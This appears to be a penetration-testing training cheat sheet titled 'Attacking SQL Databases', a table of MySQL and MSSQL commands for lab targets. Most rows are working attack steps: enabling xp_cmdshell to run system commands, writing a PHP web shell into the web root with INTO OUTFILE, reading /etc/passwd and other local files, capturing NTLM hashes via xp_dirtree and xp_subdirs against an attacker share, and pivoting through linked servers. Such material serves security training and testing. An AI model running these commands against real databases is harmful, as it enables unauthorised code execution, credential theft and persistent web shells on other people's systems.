
## Attacking SQL Databases

|**Command**|**Description**|
|---|---|
|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
|`mysql> USE htbusers;`|Select a specific database in MySQL.|
|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|

---
